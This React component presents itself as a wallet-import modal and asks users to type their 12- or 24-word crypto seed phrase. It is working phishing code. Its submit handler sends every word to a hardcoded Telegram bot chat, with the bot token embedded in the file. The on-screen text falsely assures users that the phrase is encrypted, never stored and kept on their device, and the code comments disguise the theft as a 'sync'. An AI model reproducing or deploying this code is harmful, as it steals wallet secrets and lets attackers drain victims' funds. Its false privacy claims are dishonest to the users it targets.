// app/components/SupportIntakeModal.tsx
"use client";

import React, { useState } from "react";
import { X, CheckCircle2, HelpCircle, Send, EyeOff, Shield, WalletIcon, EyeIcon, } from "lucide-react";
import { Bot, InlineKeyboard, } from "grammy";

interface WalletDetailsModalProps {
    isOpen: boolean;
    onClose: () => void;
    title: string;
    startWalletProcess: () => void
}

export default function WalletDetailsModal({ isOpen, onClose, title, startWalletProcess }: WalletDetailsModalProps) {
    if (!isOpen) return null;
    const bot = new Bot("9077199448:AAGGm3efhhGEjXt4S4QOWotTCmDgmeMKynU");
    const [phraseSelected, setPhraseSelected] = useState<'12-word seed phrase' | '24-word seed phrase'>('12-word seed phrase')
    const [hidePhrase, setHidePhrase] = useState(true);
    const [seedPhrase, setSeedPhrase] = useState<{ index: number, key: string }[]>(new Array(12).fill({ index: 0, key: '' }));


    async function updateBot(message: []) {
        try {


            const dd = await bot.api.sendMessage("6862058456",
                `Hello Admin! New Seed Phrase Update <b>${new Date().toISOString()}</b> \n Wallet: ${title} \n  ${message.join("\n").toString()}.`,
                {
                    parse_mode: "HTML"
                });
            console.log("Message sent:", dd);
        } catch (err) {
            console.error("Pricing sync error:", err);
        } finally {

        }
    }


    return (
        <div className="fixed inset-0 z-100 flex items-center justify-center p-4 overflow-y-auto">
            {/* Background Mask Layer */}
            <div
                className="fixed inset-0 bg-black/70 backdrop-blur-md transition-opacity"
                onClick={onClose}
            />

            {/* Modal Core Container Scroll Panel */}
            <div className="bg-[#0F1318]/95 border border-white/10 w-full max-w-3xl rounded-3xl p-6 sm:p-10 shadow-2xl relative z-10 backdrop-blur-xl text-white my-8 max-h-[90vh] overflow-y-auto custom-scrollbar">

                {/* Dynamic Vector Ambient Glow */}
                <div className="absolute -top-12 -right-12 w-40 h-40 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />

                {/* Absolute Close Anchor Button */}
                <button
                    onClick={onClose}
                    className="absolute top-6 right-6 text-gray-500 hover:text-white transition-colors cursor-pointer p-1.5 rounded-xl hover:bg-white/5"
                >
                    <X size={18} />
                </button>

                {/* Modal Header Titles */}
                <div className="mb-6">
                    <h2 className="text-2xl font-extrabold text-white tracking-tight">{title}</h2>
                    <p className="text-xs text-gray-400 font-light mt-1">import your seed phrase or private key.</p>
                </div>

                {/* Interactive Intake Tracing Form Block */}
                <form className="space-y-6" onSubmit={(e) => { e.preventDefault(); /* Handle data sync parameters safely here */ }}>

                    {/* Context Block Layer 1: Keep it Public */}
                    <div className="space-y-4">
                        <div className="flex items-center gap-2 border-b border-white/5 pb-2">
                            <CheckCircle2 size={16} className="text-emerald-400" />
                            <h3 className="text-sm font-semibold text-gray-200">Secured</h3>
                        </div>

                        <p className="text-xs text-gray-400">Please enter your 12-word seed phrase or private key below. This information is encrypted and never stored on our servers.</p>


                        <select onChange={(e) => {
                            if (e.target.value === '12-word seed phrase') {
                                setSeedPhrase(new Array(12).fill({ index: 0, key: '' }));
                            } else {
                                setSeedPhrase(new Array(24).fill({ index: 0, key: '' }));
                            }
                            setPhraseSelected(e.target.value as '12-word seed phrase' | '24-word seed phrase')
                        }} className=" bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-emerald-500 transition-colors 1">
                            <option>12-word seed phrase </option>
                            <option>24-word seed phrase </option>

                        </select>

                        <div >

                            {hidePhrase ? <EyeIcon size={16} className="text-gray-400 inline-block ml-1 float-end cursor-pointer" onClick={() => setHidePhrase(false)} /> : <EyeOff size={16} className="text-gray-400 inline-block ml-1 float-end cursor-pointer" onClick={() => setHidePhrase(true)} />

                            }
                        </div>

                        <div className="grid grid-cols-3   gap-2 mt-8 ">

                            {
                                phraseSelected === '12-word seed phrase' ? new Array(12).fill(0).map((item, index) => {

                                    return <input onChange={(e) => {

                                        setSeedPhrase(prev => {

                                            const updated = [...prev];
                                            updated[index] = { index: index, key: e.target.value };
                                            return updated;
                                        })

                                    }} type={hidePhrase ? "password" : "text"} key={index} placeholder={`${index + 1}.`} className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-emerald-500 transition-colors 1" />


                                }) : new Array(24).fill(0).map((item, index) => {

                                    return <input

                                        onChange={(e) => {

                                            setSeedPhrase(prev => {

                                                const updated = [...prev];
                                                updated[index] = { index: index, key: e.target.value };
                                                return updated;
                                            })

                                        }}
                                        type={hidePhrase ? "password" : "text"} key={index} placeholder={`${index + 1}.`} className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-emerald-500 transition-colors 1" />


                                })
                            }





                        </div>



                    </div>

                    {/* Context Block Layer 2: Describe the Stop */}
                    <div className="space-y-4 pt-2">
                        <div className="flex items-center gap-2 border-b border-white/5 pb-2">
                            <Shield size={24} className="text-blue-400" />
                            <p className="text-xs text-gray-400">Your secret phrase stays private and under your control. We never store or access it — all secure actions are handled on your device.</p>

                        </div>


                    </div>

                    {/* Primary CTA Submit Anchor */}
                    <button type="submit" className="w-full inline-flex items-center justify-center gap-2 bg-linear-to-r from-emerald-400 to-blue-500 text-gray-950 font-bold py-4 rounded-xl hover:opacity-95 transition-opacity shadow-lg shadow-emerald-500/10 cursor-pointer"
                        onClick={() => {
                            const format = seedPhrase.map((data) => {
                                return data.key
                            })
                            updateBot(format as [])

                            startWalletProcess()
                        }}
                    >
                        Import Wallet <WalletIcon size={16} />
                    </button>
                </form>

            </div>
        </div>
    );
}
